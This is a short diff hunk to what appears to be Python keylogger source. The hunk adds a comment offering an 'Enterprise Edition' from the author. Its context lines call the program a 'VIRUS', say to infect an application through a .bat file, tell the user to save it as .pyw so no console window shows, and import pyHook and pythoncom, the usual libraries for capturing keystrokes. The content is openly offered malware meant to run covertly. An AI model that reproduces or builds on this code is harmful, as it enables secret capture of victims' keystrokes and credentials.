@@ -1,3 +1,7 @@
+#To Get full Blown Entrprise Edition ,Contact Author
+#Requesting Enterprise Edition may include Accepting Terms and Conditions Mandaory.
+
+
 #Infect the Application with This VIRUS with the Help of a .bat File
 #MAke this as .pyw(No console....)
 import pyHook,pythoncom,sys,logging
